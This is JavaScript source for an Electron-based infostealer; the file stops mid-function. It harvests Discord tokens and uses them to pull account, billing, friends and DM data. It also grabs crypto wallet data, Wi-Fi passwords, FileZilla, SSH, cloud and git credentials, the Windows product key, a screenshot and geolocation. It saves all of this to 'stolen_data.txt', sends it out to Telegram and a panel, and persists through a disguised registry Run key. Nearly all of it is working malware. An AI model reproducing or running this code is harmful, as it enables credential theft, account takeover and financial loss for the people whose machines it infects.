require('dotenv').config()
const { app, BrowserWindow, clipboard, desktopCapturer } = require('electron')
const fs = require('fs')
const path = require('path')
const os = require('os')
app.commandLine.appendSwitch('disable-gpu-cache')
app.commandLine.appendSwitch('disk-cache-size', '0')
try { app.setPath('userData', path.join(os.tmpdir(), 'ed_' + Date.now())) } catch (e) {}
const https = require('https')
const http = require('http')
const { execSync } = require('child_process')

const tokenpattern = /[\w-]{20,28}\.[\w-]{4,10}\.[\w-]{25,35}|mfa\.[\w-]{80,90}/g
const datafile = path.join(__dirname, 'stolen_data.txt')
const clipfile = path.join(__dirname, 'clipboard.txt')
const tgtoken = process.env.TGTOKEN
const tcid = process.env.TGCHAT
let lastclip = ''

function isvalidtoken(t) {
  try {
    const p1 = t.split('.')[0]
    const dec = Buffer.from(p1, 'base64').toString()
    return /^\d{15,20}$/.test(dec)
  } catch (e) { return false }
}

function walkleveldb(dirpath, tokens) {
  if (!fs.existsSync(dirpath)) return
  const files = fs.readdirSync(dirpath)
  for (const file of files) {
    if (!file.endsWith('.ldb') && !file.endsWith('.log')) continue
    try {
      const content = fs.readFileSync(path.join(dirpath, file), 'utf8')
      const matches = content.match(tokenpattern)
      if (matches) for (const m of matches) { if (isvalidtoken(m)) tokens.push(m) }
    } catch (e) {}
  }
}

function gathertokens() {
  const tokens = []
  const basedirs = [...new Set([process.env.APPDATA, path.join(os.homedir(), 'AppData', 'Roaming')])]
  const clients = ['discord', 'discordptb', 'discordcanary', 'DiscordDevelopment']
  for (const base of basedirs) {
    for (const client of clients) {
      const clientdir = path.join(base, client)
      if (!fs.existsSync(clientdir)) continue
      const leveldbdir = path.join(clientdir, 'Local Storage', 'leveldb')
      walkleveldb(leveldbdir, tokens)
      const userdatadir = path.join(clientdir, 'User Data')
      if (fs.existsSync(userdatadir)) {
        const subdirs = fs.readdirSync(userdatadir)
        for (const subdir of subdirs) {
          walkleveldb(path.join(userdatadir, subdir, 'Local Storage', 'leveldb'), tokens)
        }
      }
      const storagedir = path.join(clientdir, 'storage')
      if (fs.existsSync(storagedir)) {
        try {
          for (const item of fs.readdirSync(storagedir)) {
            const itempath = path.join(storagedir, item)
            if (fs.statSync(itempath).isDirectory()) {
              walkleveldb(path.join(itempath, 'leveldb'), tokens)
            }
          }
        } catch (e) {}
      }
    }
  }
  return [...new Set(tokens)]
}

function getpublicip() {
  return new Promise((resolve) => {
    const req = https.get('https://api.ipify.org', (res) => {
      let data = ''
      res.on('data', (chunk) => data += chunk)
      res.on('end', () => resolve(data.trim()))
    })
    req.on('error', () => resolve('unknown'))
    req.setTimeout(5000, () => { req.destroy(); resolve('unknown') })
  })
}

function apiget(token, endpoint) {
  return new Promise((resolve) => {
    const opts = {
      hostname: 'discord.com',
      path: endpoint,
      method: 'GET',
      headers: { 'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    }
    const req = https.request(opts, (res) => {
      let data = ''
      res.on('data', (chunk) => data += chunk)
      res.on('end', () => { try { resolve(JSON.parse(data)) } catch (e) { resolve(null) } })
    })
    req.on('error', () => resolve(null))
    req.setTimeout(8000, () => { req.destroy(); resolve(null) })
    req.end()
  })
}

function checkwallets() {
  let result = ''
  const walletpaths = {
    exodus: path.join(process.env.APPDATA, 'Exodus'),
    electrum: path.join(process.env.APPDATA, 'Electrum', 'wallets'),
    atomic: path.join(process.env.APPDATA, 'atomic'),
    ledger: path.join(process.env.APPDATA, 'Ledger Live'),
    trust: path.join(process.env.APPDATA, 'Trust Wallet'),
    metamask: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn'),
    phantom: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'bfnaelmomeimhlpmgjnjophhpkkoljpa'),
    coinbase: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'hnfanknocfeofbddgcijnmhnfnkdnaad'),
    binance: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'fhbohimaelbohpjbbldcngcnapndodjp'),
    keplr: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'dmkamcknogkgcdfhhbddcghachkejeap'),
    backpack: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'ejbalbakoplchlghecdalmeeeajnimhm'),
    rabby: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'acmacodkjbdgmoleebolmdjonilkdbch'),
    xdefi: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'hmeobnajjklmcljlpmkmeffhbmogooca'),
    ronin: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'fnjhmkhggkbepokkpnjicokgiijplfnb'),
  }
  for (const [name, wpath] of Object.entries(walletpaths)) {
    if (fs.existsSync(wpath)) {
      let details = `${name}: installed`
      if (name === 'electrum') {
        try {
          const walletfiles = fs.readdirSync(wpath).filter(f => f.endsWith('.dat') || f.endsWith('.json'))
          details += ` (${walletfiles.length} wallets)`
          for (const wf of walletfiles) {
            try {
              const wcontent = fs.readFileSync(path.join(wpath, wf), 'utf8')
              const seed = wcontent.match(/"seed"\s*:\s*"([^"]+)"/)
              if (seed) details += ` | seed in ${wf}`
            } catch (e) {}
          }
        } catch (e) {}
      }
      if (name === 'exodus') {
        try {
          const exopath = path.join(wpath, 'exodus.wallet')
          if (fs.existsSync(exopath)) {
            const exofiles = fs.readdirSync(exopath)
            details += ` (${exofiles.length} files)`
          }
        } catch (e) {}
      }
      result += details + '\r\n'
    }
  }
  return result || 'none detected\r\n'
}

function gatherwifipasswords() {
  let result = ''
  try {
    const profileoutput = execSync('netsh wlan show profiles', { encoding: 'utf8', timeout: 5000 })
    const profiles = []
    for (const line of profileoutput.split('\n')) {
      if (line.includes(':')) {
        const after = line.split(':').slice(1).join(':').trim()
        if (after) profiles.push(after)
      }
    }
    for (const name of profiles) {
      try {
        const detail = execSync(`netsh wlan show profile name="${name}" key=clear`, { encoding: 'utf8', timeout: 5000 })
        for (const dl of detail.split('\n')) {
          if (dl.includes('Key Content')) {
            result += `${name}: ${dl.split(':')[1].trim()}\r\n`
            break
          }
        }
      } catch (e) {}
    }
  } catch (e) {}
  return result || 'none or access denied\r\n'
}

function gatherbookmarks() {
  let result = ''
  const browsers = {
    chrome: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks'),
    edge: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Bookmarks'),
    brave: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Bookmarks'),
    opera: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable', 'Bookmarks'),
    vivaldi: path.join(process.env.LOCALAPPDATA, 'Vivaldi', 'User Data', 'Default', 'Bookmarks'),
  }
  for (const [name, bpath] of Object.entries(browsers)) {
    if (fs.existsSync(bpath)) {
      result += `\r\n=== ${name} bookmarks ===\r\n`
      try {
        const data = JSON.parse(fs.readFileSync(bpath, 'utf8'))
        const roots = data.roots || {}
        for (const key of ['bookmark_bar', 'other', 'synced']) {
          const root = roots[key]
          if (root && root.children) {
            const walk = (children, depth) => {
              for (const child of children) {
                if (child.type === 'url') result += `${'  '.repeat(depth)}${child.name}: ${child.url}\r\n`
                else if (child.children) { result += `${'  '.repeat(depth)}[${child.name}]\r\n`; walk(child.children, depth + 1) }
              }
            }
            walk(root.children, 0)
          }
        }
      } catch (e) { result += 'failed to parse\r\n' }
    }
  }
  return result
}

function gatherextensions() {
  let result = ''
  const extdirs = {
    chrome: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Extensions'),
    edge: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Extensions'),
    brave: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Extensions'),
  }
  const knownids = {
    'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',
    'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom',
    'hnfanknocfeofbddgcijnmhnfnkdnaad': 'coinbase wallet',
    'fhbohimaelbohpjbbldcngcnapndodjp': 'binance wallet',
    'dmkamcknogkgcdfhhbddcghachkejeap': 'keplr',
    'ejbalbakoplchlghecdalmeeeajnimhm': 'backpack',
    'acmacodkjbdgmoleebolmdjonilkdbch': 'rabby',
    'hmeobnajjklmcljlpmkmeffhbmogooca': 'xdefi',
    'fnjhmkhggkbepokkpnjicokgiijplfnb': 'ronin',
    'afbcbjpbpfadlkmhmclhkeeodmamcflc': 'keplr',
    'nffaoalbilbmmfgbnbgppjihopabppdk': 'temple wallet',
    'ookjlbkiijinhpmnjffcofjonbfbajoc': 'xdefi',
    'ahkjbjfbplhjeblcmgibadojhfdppapp': 'kucoin wallet',
    'fcfhplploccbgnidhmbfombfpjfppmji': 'uniswap',
    'gckendpmclpmkaoncblkbhblfppkaccl': 'sushiswap',
    'hpglfhgfnhbgpjdenjgmdgoeiappafln': '1inch',
    'blnieiiffboillknjnepogjhkgnoapac': 'open sea',
    'joeacjoblndkkpmleplbjmgjbnmaljfe': 'magic eden',
  }
  for (const [browser, extdir] of Object.entries(extdirs)) {
    if (fs.existsSync(extdir)) {
      result += `\r\n=== ${browser} extensions ===\r\n`
      try {
        for (const extid of fs.readdirSync(extdir)) {
          const name = knownids[extid] || extid.substring(0, 20) + '...'
          result += `${name} (${extid})\r\n`
        }
      } catch (e) {}
    }
  }
  return result
}

function gatherprocesses() {
  let result = ''
  try {
    const output = execSync('powershell "Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 30 Name,@{N=\'MB\';E={[math]::Round($_.WorkingSet/1MB,1)}} | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 8000 })
    result += output.trim()
  } catch (e) {}
  return result
}

function gatherinstalled() {
  let result = ''
  try {
    const output = execSync('powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 10000 })
    result += output.trim()
  } catch (e) {}
  return result
}

function gatherenv() {
  let result = ''
  const sensitive = ['TOKEN', 'DISCORD', 'DISCORD_TOKEN', 'BOT_TOKEN', 'API_KEY', 'SECRET', 'PASSWORD', 'PASS', 'KEY']
  for (const [key, value] of Object.entries(process.env)) {
    const issensitive = sensitive.some(s => key.toUpperCase().includes(s))
    result += `${key}=${issensitive ? '***REDACTED***' : (value || '')}\r\n`
  }
  return result
}

async function capturescreenshot() {
  try {
    const sources = await desktopCapturer.getSources({ types: ['screen'], thumbnailSize: { width: 1920, height: 1080 } })
    if (sources.length > 0) {
      fs.writeFileSync(path.join(__dirname, 'screenshot.png'), sources[0].thumbnail.toPNG())
      return '\r\nscreenshot: saved\r\n'
    }
  } catch (e) {}
  return '\r\nscreenshot: failed\r\n'
}

function getdiscorduser(token) {
  return apiget(token, '/api/v9/users/@me')
}

function getdiscordbilling(token) {
  return apiget(token, '/api/v9/users/@me/billing/payment-sources')
}

function getdiscordguilds(token) {
  return apiget(token, '/api/v9/users/@me/guilds')
}

function getdiscordfriends(token) {
  return apiget(token, '/api/v9/users/@me/relationships')
}

function getdiscordchannels(token) {
  return apiget(token, '/api/v9/users/@me/channels')
}

function getdiscordconnections(token) {
  return apiget(token, '/api/v9/users/@me/connections')
}

async function gatherinfo() {
  let output = ''

  output += '=== discord tokens ===\r\n'
  const tokens = gathertokens()
  for (const token of tokens) output += token + '\r\n'

  output += '\r\n=== crypto wallets ===\r\n'
  output += checkwallets()

  output += '\r\n=== wifi passwords ===\r\n'
  output += gatherwifipasswords()

  output += '\r\n=== system ===\r\n'
  output += `hostname: ${os.hostname()}\r\n`
  output += `user: ${os.userInfo().username}\r\n`
  output += `os: ${os.platform()} ${os.release()} (${os.arch()})\r\n`
  output += `cpus: ${os.cpus().length}x ${os.cpus()[0].model}\r\n`
  output += `ram: ${Math.round(os.totalmem() / 1073741824)}gb total, ${Math.round(os.freemem() / 1073741824)}gb free\r\n`
  output += `uptime: ${Math.round(os.uptime() / 3600)}h\r\n`
  output += `public ip: ${await getpublicip()}\r\n`

  output += '\r\n=== geolocation ===\r\n'
  output += await getgeolocation()

  const nets = os.networkInterfaces()
  for (const [name, addrs] of Object.entries(nets)) {
    if (addrs) for (const addr of addrs) {
      if (addr.family === 'IPv4') output += `net: ${name} - ${addr.address}\r\n`
    }
  }

  try {
    output += '\r\n=== drives ===\r\n'
    const drives = execSync('wmic logicaldisk where drivetype=3 get deviceid,size,freespace', { encoding: 'utf8', timeout: 5000 })
    for (const line of drives.split('\n')) {
      const match = line.match(/([A-Z]:)\s+(\d+)\s+(\d+)/)
      if (match) {
        const dl = match[1]
        const ds = Math.round(parseInt(match[2]) / 1073741824)
        const df = Math.round(parseInt(match[3]) / 1073741824)
        output += `${dl}: ${df}gb / ${ds}gb free\r\n`
      }
    }
  } catch (e) {}

  output += '\r\n=== hardware info ===\r\n'
  output += gathermoresysinfo()

  output += '\r\n=== processes (top 30 by memory) ===\r\n'
  output += gatherprocesses()

  output += '\r\n=== environment (sensitive redacted) ===\r\n'
  output += gatherenv()

  output += '\r\n=== installed programs ===\r\n'
  output += gatherinstalled()

  output += gatherextensions()

  output += gatherbookmarks()

  output += '\r\n=== filezilla ===\r\n'
  output += gatherfilezilla()

  output += '\r\n=== steam ===\r\n'
  output += gathersteam()

  output += '\r\n=== ssh keys ===\r\n'
  output += gathersshkeys()

  output += '\r\n=== telegram ===\r\n'
  output += gathertelegram()

  output += '\r\n=== git/npm configs ===\r\n'
  output += gathergitcreds()

  output += '\r\n=== cloud credentials ===\r\n'
  output += gathercloudcreds()

  output += '\r\n=== winscp sessions ===\r\n'
  output += gatherwinscp()

  output += '\r\n=== recent files ===\r\n'
  output += gatherrecentfiles()

  output += '\r\n=== usb history ===\r\n'
  output += gatherusbhistory()

  output += '\r\n=== rdp connections ===\r\n'
  output += gatherrdpconnections()

  output += '\r\n=== vpn configs ===\r\n'
  output += gathervpnconfigs()

  output += '\r\n=== browser profiles ===\r\n'
  output += gatherbrowserprofiles()

  output += '\r\n=== browser data files ===\r\n'
  output += gatherbrowserfiles()

  output += '\r\n=== password managers ===\r\n'
  output += gatherchromeextrawallets()

  output += '\r\n=== firefox/gecko data ===\r\n'
  output += gatherfoxdata()

  output += '\r\n=== discord additional ===\r\n'
  output += gatherdiscordadditional()

  output += '\r\n=== discord themes/plugins ===\r\n'
  output += gatherdiscordthemes()

  output += '\r\n=== messenger apps ===\r\n'
  output += gathermessengerapps()

  output += '\r\n=== browser credentials extracted ===\r\n'
  output += getallbrowsercredentials()

  output += '\r\n=== windows saved credentials ===\r\n'
  output += gatherwindowssavedcreds()

  output += '\r\n=== docker/kube/pgpass/creds ===\r\n'
  output += gatherentracreds()

  output += '\r\n=== vs code data ===\r\n'
  output += gathervscodedata()

  output += '\r\n=== putty sessions ===\r\n'
  output += gatherputtysessions()

  output += '\r\n=== mobaxterm ===\r\n'
  output += gathermobaxterm()

  output += '\r\n=== db connections ===\r\n'
  output += gatherdbconnections()

  output += '\r\n=== game launchers ===\r\n'
  output += gathergamedata()

  output += '\r\n=== thunderbird ===\r\n'
  output += gatherthunderbird()

  output += '\r\n=== outlook profiles ===\r\n'
  output += gatheroutlookprofiles()

  output += '\r\n=== spotify ===\r\n'
  output += gatherspotify()

  output += '\r\n=== wsl ===\r\n'
  output += gatherwsl()

  output += '\r\n=== hosts file ===\r\n'
  output += gatherhostsfile()

  output += '\r\n=== certificates ===\r\n'
  output += gathercerts()

  output += '\r\n=== services (non-ms) ===\r\n'
  output += gatherservices()

  output += '\r\n=== browser leveldb ===\r\n'
  output += gatherallleveldb()

  output += '\r\n=== browser web data ===\r\n'
  output += gatherchromewebdata()

  output += '\r\n=== browser sessions ===\r\n'
  output += gatherchromesessions()

  output += '\r\n=== jetbrains ides ===\r\n'
  output += gatherjetbrains()

  output += '\r\n=== browser downloads ===\r\n'
  output += gatherbrowserdownloads()

  for (const token of tokens) {
    const user = await getdiscorduser(token)
    if (!user || !user.id) continue

    output += '\r\n=== discord account ===\r\n'
    output += `id: ${user.id}\r\n`
    output += `name: ${user.username}#${user.discriminator || '0'}\r\n`
    output += `global name: ${user.global_name || 'none'}\r\n`
    output += `email: ${user.email || 'none'}\r\n`
    output += `phone: ${user.phone || 'none'}\r\n`
    output += `verified: ${user.verified}\r\n`
    output += `mfa: ${user.mfa_enabled}\r\n`
    output += `nsfw allowed: ${user.nsfw_allowed !== false}\r\n`
    output += `locale: ${user.locale || 'none'}\r\n`
    output += `bio: ${user.bio || 'none'}\r\n`
    output += `premium: ${user.premium_type || 0} (${['none','nitro classic','nitro','nitro basic'][user.premium_type || 0]})\r\n`
    output += `created: ${new Date(parseInt(user.id) / 4194304 + 1420070400000).toISOString()}\r\n`
    output += `avatar: https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar && user.avatar.startsWith('a_') ? 'gif' : 'png'}\r\n`

    const billing = await getdiscordbilling(token)
    if (billing && billing.length > 0) {
      output += '\r\n=== billing/payment methods ===\r\n'
      for (const b of billing) {
        const btype = { 1: 'credit card', 2: 'paypal' }[b.type] || b.type
        output += `  ${btype}`
        if (b.brand) output += ` (${b.brand}`
        if (b.last_4) output += ` ending in ${b.last_4}`
        if (b.brand || b.last_4) output += ')'
        output += '\r\n'
        if (b.billing_address) {
          const ba = b.billing_address
          output += `  address: ${ba.line_1 || ''}, ${ba.city || ''}, ${ba.state || ''} ${ba.postal_code || ''}, ${ba.country || ''}\r\n`
        }
        if (b.invoice) output += `  email: ${b.invoice.email || 'none'}\r\n`
      }
    }

    const guilds = await getdiscordguilds(token)
    if (guilds && guilds.length > 0) {
      output += `\r\n=== guilds (${guilds.length} total) ===\r\n`
      const withowner = guilds.filter(g => g.owner)
      output += `  owned: ${withowner.length}\r\n`
      for (const g of withowner) output += `  [owner] ${g.name} (${g.id}) - ${g.approximate_member_count || '?'} members\r\n`
      for (const g of guilds) {
        if (!g.owner) output += `  ${g.name} (${g.id}) - ${g.approximate_member_count || '?'} members\r\n`
      }
    }

    const friends = await getdiscordfriends(token)
    if (friends && friends.length > 0) {
      output += `\r\n=== friends/relationships (${friends.length}) ===\r\n`
      for (const f of friends) {
        if (f.user) {
          const ftype = { 1: 'friend', 2: 'blocked', 3: 'incoming', 4: 'outgoing' }[f.type] || 'unknown'
          output += `  ${f.user.username}#${f.user.discriminator || '0'} (${f.user.id}) - ${ftype}\r\n`
        }
      }
    }

    const dms = await getdiscordchannels(token)
    if (dms && dms.length > 0) {
      output += `\r\n=== recent dm channels (${dms.length}) ===\r\n`
      for (const dm of dms.slice(0, 10)) {
        if (dm.recipients) {
          for (const r of dm.recipients) {
            output += `  dm: ${r.username}#${r.discriminator || '0'} (${r.id})\r\n`
          }
        }
      }
    }

    const connections = await getdiscordconnections(token)
    if (connections && connections.length > 0) {
      output += `\r\n=== connected accounts ===\r\n`
      for (const c of connections) {
        output += `  ${c.type}: ${c.name} (${c.verified ? 'verified' : 'unverified'})\r\n`
      }
    }

    const nitro = await getdiscorduser(token)
    if (nitro && nitro.premium_type) {
      const sub = await apiget(token, '/api/v9/users/@me/billing/subscriptions')
      if (sub && sub.length > 0) {
        output += '\r\n=== nitro subscriptions ===\r\n'
        for (const s of sub) {
          output += `  type: ${s.plan_id || 'unknown'}\r\n`
          output += `  status: ${s.status}\r\n`
          output += `  renews: ${s.current_period_end || 'unknown'}\r\n`
          if (s.cancel_at_period_end) output += `  cancel scheduled: yes\r\n`
        }
      }
    }

    break
  }

  output += await capturescreenshot()

  fs.writeFileSync(datafile, output)

  const ssfile = path.join(__dirname, 'screenshot.png')
  sendtopanel(output, ssfile)
  sendtotg(output)
  if (fs.existsSync(ssfile)) sendfiletotg(ssfile, 'screenshot')
}

function gatherfilezilla() {
  let result = ''
  const fzpath = path.join(process.env.APPDATA, 'FileZilla', 'recentservers.xml')
  if (fs.existsSync(fzpath)) {
    try {
      const content = fs.readFileSync(fzpath, 'utf8')
      const servers = content.match(/<Server>([\s\S]*?)<\/Server>/g) || []
      for (const server of servers) {
        const host = server.match(/<Host>([^<]+)<\/Host>/)
        const port = server.match(/<Port>([^<]+)<\/Port>/)
        const user = server.match(/<User>([^<]+)<\/User>/)
        const pass = server.match(/<Pass>([^<]+)<\/Pass>/)
        if (host) result += `  ftp://${user ? user[1] : '?'}:${pass ? pass[1] : '?'}@${host[1]}:${port ? port[1] : '21'}\r\n`
      }
    } catch (e) {}
  }
  return result
}

function gathersteam() {
  let result = ''
  const paths = [
    path.join('C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf'),
    path.join('C:\\Program Files\\Steam\\config\\loginusers.vdf'),
    path.join(os.homedir(), '.steam', 'config', 'loginusers.vdf')
  ]
  for (const steampath of paths) {
    if (fs.existsSync(steampath)) {
      try {
        result += fs.readFileSync(steampath, 'utf8')
      } catch (e) {}
    }
  }
  const ssfnpaths = [
    path.join(os.homedir(), 'AppData', 'Local', 'Steam', 'htmlcache', 'Steam'),
    path.join('C:\\Program Files (x86)\\Steam\\config')
  ]
  for (const ssfnpath of ssfnpaths) {
    if (fs.existsSync(ssfnpath)) {
      try {
        for (const f of fs.readdirSync(ssfnpath)) {
          if (f.startsWith('ssfn') || f.includes('ssfn')) result += `ssfn file: ${f}\r\n`
        }
      } catch (e) {}
    }
  }
  return result
}

function gathersshkeys() {
  let result = ''
  const sshdir = path.join(os.homedir(), '.ssh')
  if (fs.existsSync(sshdir)) {
    try {
      for (const f of fs.readdirSync(sshdir)) {
        const fpath = path.join(sshdir, f)
        const stat = fs.statSync(fpath)
        if (f === 'id_rsa' || f === 'id_ed25519' || f === 'id_ecdsa' || f === 'id_dsa' || f.includes('id_') || f === 'config' || f === 'known_hosts' || f === 'authorized_keys') {
          result += `${f} (${stat.size} bytes)\r\n`
          if (f === 'config' || f === 'known_hosts') {
            try {
              const content = fs.readFileSync(fpath, 'utf8').substring(0, 2000)
              result += content + '\r\n'
            } catch (e) {}
          }
        }
      }
    } catch (e) {}
  }
  return result
}

function gathermoresysinfo() {
  let result = ''
  try {
    const gpu = execSync('wmic path win32_VideoController get name, adapterram', { encoding: 'utf8', timeout: 5000 })
    for (const line of gpu.split('\n')) {
      const m = line.match(/(.+?)\s{2,}(\d+)/)
      if (m) {
        const rammb = Math.round(parseInt(m[2]) / 1048576)
        result += `gpu: ${m[1].trim()} (${rammb}mb)\r\n`
      }
    }
  } catch (e) {}
  try {
    const bios = execSync('wmic bios get serialnumber, manufacturer, smbiosbiosversion', { encoding: 'utf8', timeout: 5000 })
    for (const line of bios.split('\n')) {
      const parts = line.trim().split(/\s{2,}/)
      if (parts.length >= 3 && parts[0] !== 'SerialNumber') result += `bios: ${parts[1]} ${parts[0]} (${parts[2] || ''})\r\n`
    }
  } catch (e) {}
  try {
    const winproduct = execSync('powershell "(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey" 2>$null', { encoding: 'utf8', timeout: 5000 })
    if (winproduct.trim()) result += `windows product key: ${winproduct.trim()}\r\n`
  } catch (e) {}
  try {
    const monitor = execSync('wmic path win32_DesktopMonitor get name, screenwidth, screenheight', { encoding: 'utf8', timeout: 5000 })
    for (const line of monitor.split('\n')) {
      const parts = line.trim().split(/\s{2,}/)
      if (parts.length >= 3 && parts[0] !== 'Name') result += `display: ${parts[0]} (${parts[1]}x${parts[2]})\r\n`
    }
  } catch (e) {}
  try {
    const defaultbrowser = execSync('powershell "(Get-ItemProperty \'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\').ProgId" 2>$null', { encoding: 'utf8', timeout: 5000 })
    if (defaultbrowser.trim()) result += `default browser: ${defaultbrowser.trim()}\r\n`
  } catch (e) {}
  try {
    const startup = execSync('powershell "Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location | Format-Table -AutoSize -HideTableHeaders" 2>$null', { encoding: 'utf8', timeout: 5000 })
    if (startup.trim()) result += `\r\nstartup programs:\r\n${startup.trim()}\r\n`
  } catch (e) {}
  return result
}

async function getgeolocation() {
  try {
    const ip = await getpublicip()
    if (ip === 'unknown') return 'geolocation: unknown\r\n'
    const data = await new Promise((resolve) => {
      const req = https.get(`http://ip-api.com/json/${ip}`, (res) => {
        let d = ''
        res.on('data', (c) => d += c)
        res.on('end', () => { try { resolve(JSON.parse(d)) } catch (e) { resolve(null) } })
      })
      req.on('error', () => resolve(null))
      req.setTimeout(5000, () => { req.destroy(); resolve(null) })
    })
    if (data) {
      return `ip: ${data.query}\r\ncountry: ${data.country}\r\nregion: ${data.regionName}\r\ncity: ${data.city}\r\nzip: ${data.zip}\r\nisp: ${data.isp}\r\norg: ${data.org}\r\nlat: ${data.lat}\r\nlon: ${data.lon}\r\n`
    }
  } catch (e) {}
  return 'geolocation: failed\r\n'
}

function gathertelegram() {
  let result = ''
  const tgdir = path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata')
  if (fs.existsSync(tgdir)) {
    result += 'telegram: installed\r\n'
    try {
      for (const f of fs.readdirSync(tgdir)) {
        const fpath = path.join(tgdir, f)
        const stat = fs.statSync(fpath)
        if (stat.isFile() && f.endsWith('.s') || f === 'settings' || f.includes('key') || f.includes('auth')) {
          result += `  ${f} (${stat.size} bytes)\r\n`
        }
      }
    } catch (e) {}
  }
  return result
}

function persiststartup() {
  try {
    execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSystemHelper" /t REG_SZ /d "${process.execPath}" /f`, { timeout: 5000 })
  } catch (e) {}
}

function gathergitcreds() {
  let result = ''
  const gitconfig = path.join(os.homedir(), '.gitconfig')
  if (fs.existsSync(gitconfig)) {
    try {
      const content = fs.readFileSync(gitconfig, 'utf8')
      if (content.trim()) result += content + '\r\n'
    } catch (e) {}
  }
  const nupkgconfig = path.join(process.env.APPDATA, 'npm', '.npmrc')
  if (fs.existsSync(nupkgconfig)) {
    try {
      const content = fs.readFileSync(nupkgconfig, 'utf8')
      if (content.trim()) result += `npm: ${content}\r\n`
    } catch (e) {}
  }
  const yarnconfig = path.join(os.homedir(), '.yarnrc.yml')
  if (fs.existsSync(yarnconfig)) {
    try {
      const content = fs.readFileSync(yarnconfig, 'utf8')
      if (content.trim()) result += `yarn: ${content}\r\n`
    } catch (e) {}
  }
  const pipdir = path.join(process.env.APPDATA, 'pip', 'pip.ini')
  if (fs.existsSync(pipdir)) {
    try {
      const content = fs.readFileSync(pipdir, 'utf8')
      if (content.trim()) result += `pip: ${content}\r\n`
    } catch (e) {}
  }
  return result
}

function gathercloudcreds() {
  let result = ''
  const awsdir = path.join(os.homedir(), '.aws')
  if (fs.existsSync(awsdir)) {
    result += 'aws installed\r\n'
    try {
      for (const f of fs.readdirSync(awsdir)) {
        const content = fs.readFileSync(path.join(awsdir, f), 'utf8')
        const lines = content.split('\n').filter(l => l.includes('=') && !l.trim().startsWith('#')).join('\r\n  ')
        if (lines.trim()) result += `  ${f}:\r\n  ${lines}\r\n`
      }
    } catch (e) {}
  }
  const azuredir = path.join(os.homedir(), '.azure')
  if (fs.existsSync(azuredir)) {
    result += 'azure installed\r\n'
    try {
      const creds = path.join(azuredir, 'accessTokens.json')
      if (fs.existsSync(creds)) {
        const content = JSON.parse(fs.readFileSync(creds, 'utf8'))
        for (const token of [].concat(content)) {
          if (token.token || token.accessToken) result += `  azure token: ${(token.token || token.accessToken).substring(0, 40)}...\r\n`
        }
      }
    } catch (e) {}
  }
  const gcpdir = path.join(os.homedir(), '.config', 'gcloud')
  if (fs.existsSync(gcpdir)) {
    result += 'gcloud installed\r\n'
    try {
      const creds = path.join(gcpdir, 'credentials.db')
      if (fs.existsSync(creds)) result += '  gcp credentials.db found\r\n'
      const legacy = path.join(gcpdir, 'legacy_credentials')
      if (fs.existsSync(legacy)) {
        for (const acct of fs.readdirSync(legacy)) {
          result += `  gcp account: ${acct}\r\n`
        }
      }
    } catch (e) {}
  }
  return result
}

function gatherwinscp() {
  let result = ''
  const winscpini = path.join(process.env.APPDATA, 'WinSCP.ini')
  if (fs.existsSync(winscpini)) {
    try {
      const content = fs.readFileSync(winscpini, 'utf8')
      const sessions = content.split(/\[.*?Sessions.*?\]/i)
      for (const section of content.split('\n')) {
        if (section.trim().startsWith('[') && section.includes('\\')) {
          result += `  ${section.trim()}\r\n`
        }
      }
      const sessionss = content.match(/\[Sessions\\[^\]]+\]/g) || []
      for (const s of sessionss) {
        const sname = s.replace('[Sessions\\', '').replace(']', '')
        const hostm = content.match(new RegExp(`HostName=${sname}\\b`, 'i'))
        if (hostm) result += `  ${sname} (host found)\r\n`
      }
    } catch (e) {}
  }
  return result
}

function gatherrecentfiles() {
  let result = ''
  try {
    const output = execSync('powershell "Get-ChildItem \\"$env:APPDATA\\Microsoft\\Windows\\Recent\\" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 30 Name,LastWriteTime | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
